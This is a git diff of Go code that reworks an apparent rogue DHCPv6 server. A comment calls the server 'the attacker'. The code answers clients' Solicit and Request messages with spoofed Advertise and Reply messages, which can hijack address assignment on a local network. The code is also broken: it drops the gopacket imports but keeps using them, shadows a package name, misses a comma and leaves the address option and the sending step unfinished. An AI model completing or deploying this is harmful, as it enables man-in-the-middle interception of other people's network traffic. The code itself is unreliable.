@@ -3,9 +3,7 @@ package dhcp6
 import (
 	"fmt"
 	"net"
-
-	"github.com/google/gopacket"
-	"github.com/google/gopacket/layers"
+	"github.com/insomniacslk/dhcp/dhcpv6"
 	"golang.org/x/net/ipv6"
 )
 
@@ -47,39 +45,29 @@ func ListenDHCPv6(ifaceName string, macAddr string, offeredIP net.IP) error {
 
 	// receive new UDP packet (n -> It returns the number of bytes copied into) -- addr
 	for {
-		n, _, err := conn.ReadFrom(buf)
+		n, addr, err := conn.ReadFrom(buf)
 
 		if err != nil {
 			continue
 		}
 
 		// need to parse buffer
-		packet := gopacket.NewPacket(buf[:n], layers.LayerTypeDHCPv6, gopacket.Default)
+		dhcp, err := dhcpv6.MessageFromBytes(buf[:n])
 
-		// extract the generic dhcpv6 Layer
-		dhcpLayer := packet.Layer(layers.LayerTypeDHCPv6)
-		
-		if dhcpLayer == nil {
-			continue
-		}
-
-		// Type assertion to get the exact layer with all the fields for dhcpv6
-		dhcp, ok := dhcpLayer.(*layers.DHCPv6)
-
-		if !ok {
+		if err != nil {
 			continue
 		}
 
 		// Switch case base on the message type
 		switch dhcp.MsgType {
 
-		case layers.DHCPv6MsgTypeSolicit:
+		case dhcpv6.MessageTypeSolicit:
 			// Sending Advertise
-			sendDHCPv6Response()
+			sendDHCPv6Response(conn, addr, dhcp, dhcpv6.MessageTypeAdvertise, offeredIP, macAddr)
 
-		case layers.DHCPv6MsgTypeRequest:
+		case dhcpv6.MessageTypeRequest:
 			//send Reply
-			sendDHCPv6Response()
+			sendDHCPv6Response(conn, addr, dhcp, dhcpv6.MessageTypeReply, offeredIP, macAddr)
 		}
 	}
 
@@ -87,8 +75,67 @@ func ListenDHCPv6(ifaceName string, macAddr string, offeredIP net.IP) error {
 
 }
 
-
 // Sending response (Advertise / Reply)
-func sendDHCPv6Response() {
+func sendDHCPv6Response(conn net.PacketConn, addr net.Addr, dhcp *dhcpv6.Message, msgType dhcpv6.MessageType, offeredIP net.IP, macAddr string) {
+
+	// Advertise (msg-type, transaction-id, options), udp dst port 546
+	// options: (Client Identifier - DUID, server-identifer - DUID, Identity Association for Non-temporary Address (IA_NA))
+
+	// Extract DUID (inside the clientID)
+	var clientID []byte
+
+	// IAID must be unique among the identifiers for all of this client's IA_NAs (Need to be extracted)
+	var iaid []byte
+
+	for _, opt := range dhcp.Options {
+
+		if opt.Code == layers.DHCPv6OptClientID {
+			clientID = opt.Data
+		}
+
+		if opt.Code == layers.DHCPv6OptIANA {
+			iaid = opt.Data[:4]
+		}
+
+	}
+
+	// Build the server DUID (in this case me - the attacker)
+	// DUID Based on Link-Layer Address Plus Time (DUID-LLT) -> combine timestamp + MAC address
+	mac, _ := net.ParseMAC(macAddr)
+	serverDUID := append([]byte{
+		0x00, 0x01, // DUID type = 1 (LLT) -> 6 bits = 2 bytes 
+		0x00, 0x01, // Hardware type = Ethernet -> 16 bits = 2 bytes
+		0x00, 0x00, 0x00, 0x01,	// time (32 bit) -> variable = 6 bytes for Ethernet -> fixed for now (1 second)
+	}, mac...)
+
+
+	// building the dhcpv6 layer
+	dhcpv6 := layers.DHCPv6{
+		MsgType: msgType,
+		TransactionID: dhcp.TransactionID,
+
+		Options: layers.DHCPv6Options{
+
+			// client ID
+			layers.DHCPv6Option{
+				Code: layers.DHCPv6OptClientID,
+				Data: clientID,
+			},
+
+			// Server ID
+			layers.DHCPv6Option{
+				Code: layers.DHCPv6OptServerID,
+				Data: serverDUID,
+			},
+
+			// IA_NA (need: IAID, IA_Address (inside) -> )
+			layers.DHCPv6Option{
+				Code: layers.DHCPv6OptIANA,
+				// Data: ,
+			}
+
+		},
+	}
+
 
 }
